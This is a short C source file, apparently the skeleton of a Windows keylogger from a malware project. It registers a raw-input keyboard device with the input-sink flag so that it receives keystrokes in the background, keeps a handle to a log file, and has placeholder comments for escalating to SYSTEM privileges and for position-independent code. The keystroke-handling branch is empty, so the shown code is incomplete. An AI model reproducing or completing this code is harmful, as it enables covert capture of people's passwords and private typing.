#include "VxHeader.h"

LRESULT CALLBACK WndProc(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)
{
	RAWINPUTDEVICE Rid;
	UINT Size;
	RAWINPUT *Ri;
	static HANDLE hLog;
	static API_TABLE Api;
	static HDEVNOTIFY hDevice;
	static LPVOID Strings = NULL;
	static PPEB pPeb;
	static HANDLE hSystem;
	static BOOL bFlag;

	switch (Message)
	{
		case WM_CREATE:
		{
			pPeb = RtlGetPeb();
			break;
		}
		case WM_INPUT:
		{
			if (!bFlag)
			{

			}
			
			break;
		}
		case WM_DESTROY:
		{
			if (hLog != INVALID_HANDLE_VALUE)
				Api.NtClose(hLog);

			break;
		}

		case WM_PASS_STRUCTURE:
		{
			VxCopyMemory(&Api, (PAPI_TABLE)lParam, sizeof(Api));

			Rid.usUsage = 0x06;
			Rid.usUsagePage = 0x01;
			Rid.hwndTarget = hWnd;
			Rid.dwFlags = RIDEV_INPUTSINK;

			//escalate to system....
			

			//create file

			if (!Api.RegisterRawInputDevices(&Rid, 0x01, sizeof(RAWINPUTDEVICE)))
				return -1;
			else
				break;
		}

		default:
			return DefWindowProcW(hWnd, Message, wParam, lParam); //make position independent
	}

	return ERROR_SUCCESS;
}